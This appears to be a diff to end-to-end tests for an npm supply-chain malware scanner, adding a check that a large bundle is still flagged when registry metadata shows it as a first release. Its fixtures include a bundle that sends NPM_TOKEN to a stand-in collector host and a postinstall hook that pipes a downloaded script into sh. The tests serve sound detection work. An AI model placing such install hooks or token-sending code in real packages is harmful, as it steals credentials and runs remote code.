@@ -1,6 +1,6 @@
 'use strict';
 
-// End-to-end tests of contextual FP caps F2, F3, F4, F5, F6, F7, F9, F12 and F15 through the real CLI (MUADDIB_DEBUG=1
+// End-to-end tests of contextual FP caps F1, F2, F3, F4, F5, F6, F7, F9, F12 and F15 through the real CLI (MUADDIB_DEBUG=1
 // prints the "[FP-CAP] ... <feature>" line; the JSON score is on stdout). F10 has its own
 // file; F13 is covered end to end in tests/audit-2026-05/typosquat-findings.test.js.
 // F11 (ai_agent_bot) is not covered here: its "agent runtime path" condition needs a finding
@@ -297,6 +297,34 @@ async function runE2EFpCapTests() {
   await asyncTest('F15 E2E: same package piping a download into a shell at install -> neither cap applies', async () => {
     const s = scanCli(mcpServerPkg({ postinstall: 'curl -s https://get.example-cdn.net/i.sh | sh' }));
     assert(!s.capLine.includes('mcp_server_benign_lifecycle') && !s.capLine.includes('mcp_server_env_access') && s.score >= 75, show(s));
+  });
+
+  await runF1TimelineTests();
+}
+
+// F1 bundle_without_install_scripts through the pipeline with registry metadata injected the
+// way the monitor does it (options.npmRegistryMeta); the CLI scans above run without registry.
+async function runF1TimelineTests() {
+  const { run } = require('../../src/index.js');
+  const body = 'module.exports = function helper(a, b) { return [a, b].map(function (x) { return x + 1; }); };\n';
+  const bundle = body.repeat(Math.ceil(130 * 1024 / body.length)) + postTo('collector.example-exfil.net', 'NPM_TOKEN');
+  const scanWithTimeline = async (time) => {
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-e2e-f1-'));
+    try {
+      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'f1-timeline-x', version: '1.0.1', main: 'index.js' }));
+      fs.writeFileSync(path.join(dir, 'index.js'), bundle);
+      const options = { _capture: true };
+      if (time) options.npmRegistryMeta = { time, registry_version: '1.0.1', latest_version: '1.0.1' };
+      const r = await run(dir, options);
+      return r.summary.riskScore;
+    } finally {
+      cleanupTemp(dir);
+    }
+  };
+  await asyncTest('F1 E2E: bundle sending the registry token, first published version -> cap does not apply', async () => {
+    const first = await scanWithTimeline({ '1.0.1': '2026-11-20T10:00:00.000Z' });
+    const noMeta = await scanWithTimeline(null);
+    assert(noMeta <= 30 && first >= 75, `no registry metadata=${noMeta}, first version=${first}`);
   });
 }
 
